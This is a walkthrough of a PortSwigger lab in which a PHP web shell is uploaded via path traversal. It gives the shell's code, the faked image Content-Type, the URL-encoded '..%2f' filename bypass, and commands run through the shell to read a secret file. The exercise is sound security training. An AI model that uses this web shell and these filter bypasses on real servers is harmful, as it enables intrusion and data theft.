## Welcome, my friend. Today we will start the [3. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal) in ```portswigger```

# Explain this Scenario:

## Prevent the execution of files in directories accessible by users

### Preventing uploading dangerous files:
#### It is always best to prevent dangerous file types from being uploaded in the first place. However, if some files of these types leak to the server, the second step is to prevent the execution of any scripts that may be present.

### How to prevent scripts from executing:
#### Check ```MIME type```: The server is configured to run only scripts that match the ```MIME``` type it is configured to run. If the MIME type of the file does not match what is expected, the server may display an error message or present the file contents as plain text instead of playing it.

 Example:

```
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com
```

### Response:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

### In this scenario, if the server displays the file contents as plain text, the script was not executed, which reduces the risk of a malicious web shell.


## How to do it:

#### ```Test server settings```: Try uploading a file to a directory that is not supposed to contain files uploaded by users. Check how the server handles files with unexpected extensions.
#### ```Response Check```: Monitor how the server handles different types of files and the server's response when trying to access these files.

# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/1b7229a1-3813-48f9-b6f0-0dcc0d603e78)


#### Let's create a php malicious payload in file ```tor.php```:

### within tor.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)

### Now, Let's upload this malicious payload to server.


![image](https://github.com/user-attachments/assets/cadd334c-4afb-45e0-9b65-99acf94e6f97)

#### WOW! The file has been uploaded successfully.

### From Task 1, we explore that our file is within this path ```/files/avatars/file_name?parameter=command``` like this:

```
/files/avatars/tor.php?tor=id
```

![image](https://github.com/user-attachments/assets/2ba96ebf-d955-4ac6-b9a9-659ca6a786c5)

#### Hmmm, no there any thing! I think due ```MIME type```
### ok Let's open the burp tool to explore what happen.

![image](https://github.com/user-attachments/assets/b72f936b-4319-48cd-9f2e-eb3599050cd3)

#### Well, Let's change this ```Content-Type: application/x-php``` to ```Content-Type: image/jpeg```:

#### we know that this path ```/files/avatars/any_file``` is protect form malicios files, So we save our file in other path, we will using  ```Path Traversal``` to help us bypassing this path.

### We change file name to ```../tor.php``` 


![image](https://github.com/user-attachments/assets/4f0bb4a1-11a7-44ea-8bdc-170ed1af6b5e)

### Hmm, there here filter to remove ```/``` , So we instead of ```%2f``` . this is url encoding. it becomes:

```
..%2ftor.php
```

![image](https://github.com/user-attachments/assets/c0ac5ca2-b0c4-4dd5-93bd-259a931f0963)

### Well done! we change this path and become ```/files/tor.php?tor=id``` and not ```/files/avatars/tor.php?tor=id```:

![image](https://github.com/user-attachments/assets/29b76d1f-1065-4a33-862b-c33930efc249)



#### Ok this task requrie reach to /home/carlos/secret file.

```
/files/tor.php?tor=cat /home/carlos/secret
```

![image](https://github.com/user-attachments/assets/818b4872-10da-4ba5-98e8-5647811ef465)


#### alert: this secret is douple, copy single secret only.
### Let's Submit this secret using the button provided in the lab banner.

## Then ...
